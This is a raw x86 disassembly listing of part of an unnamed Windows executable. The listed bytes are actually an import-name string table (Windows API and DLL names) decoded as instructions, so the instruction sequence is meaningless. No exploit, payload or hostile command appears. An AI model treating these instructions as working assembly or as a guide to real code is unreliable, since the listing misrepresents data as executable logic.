  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
